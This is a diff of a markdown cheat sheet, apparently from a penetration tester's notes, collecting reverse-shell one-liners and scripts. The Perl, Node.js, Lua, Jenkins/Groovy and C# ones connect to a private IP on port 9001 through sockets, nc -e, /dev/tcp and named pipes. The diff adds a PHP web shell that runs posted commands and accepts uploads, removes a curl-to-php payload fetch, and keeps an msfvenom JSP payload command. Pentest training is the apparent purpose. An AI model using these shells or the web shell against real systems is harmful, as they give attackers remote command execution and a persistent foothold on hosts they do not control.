@@ -1,17 +1,27 @@
 ---
-title: 📝 AD CheatSheet
+title: 📝 Reverse Shells
 tags: #cheatsheet
 ---
-## Reverse Shells
-_Credits: These reverse shells examples are reffered to [EzpzShell](https://github.com/H0j3n/EzpzShell) by [@h0j3n](https://twitter.com/h0j3n)_
 ### php reverse shell
 You can get a full reverse shell script [here](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) by PentestMonkey
-```
-<?php system("curl http://192.168.86.139/shell.php|php"); ?>
+```php
+<?php 
+  if(!empty($_POST[1])){
+    if (!empty($_POST["b"])){
+      pclose(popen($_POST[1], 'r'));
+    } else{
+      system($_POST[1]);
+    }
+  }
+
+  if(!empty($_FILES["f"])){
+    move_uploaded_file($_FILES['f']['tmp_name'], basename($_FILES['f']['name']));
+  }
+?>
 ```
 
 ### perl reverse shell
-```
+```perl
 # Example 1
 perl -e 'use Socket;$i="192.168.86.139";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 
@@ -29,7 +39,7 @@ if(connect(S,sockaddr_in($p,inet_aton($i)))){
 ```
 
 ### nodejs reverse shell
-```
+```js
 # Example 1
 require('child_process').exec('nc -e /bin/sh 192.168.86.139 9001')
 
@@ -49,7 +59,7 @@ require('child_process').exec('nc -e /bin/sh 192.168.86.139 9001')
 ```
 
 ### c reverse shell
-```
+```cpp
 ######################### Example 1 #############################
 ## Compile : gcc -shared -o libchill.so -fPIC libchill.c
 
@@ -98,7 +108,7 @@ int main(void){
 
 ### c# reverse shell
 This c-sharp reverse shell is from [PuckieStyle Blog](https://www.puckiestyle.nl/c-simple-reverse-shell/)._Note: Change `cmd.exe` to `bash` if you are using against linux environment_
-```
+```cs
 using System;
 using System.Text;
 using System.IO;
@@ -171,14 +181,14 @@ namespace ConnectBack
 ```
 
 ### jenkins reverse shell
-```
+```java
 r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/192.168.86.139/9001;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
 ```
 
 ### lua reverse shell
-```
+```lua
 # Example 1
 os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.86.139 9001 >/tmp/f")
 
@@ -187,6 +197,10 @@ lua -e 'os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 192
 ```
 
 ### jsp reverse shell
-```
+```java
 # Msfvenom => msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.86.139 LPORT=9001 -f raw > shell.jsp
 ```
+
+## References
+* https://github.com/H0j3n/EzpzShell
+* https://www.revshells.com/
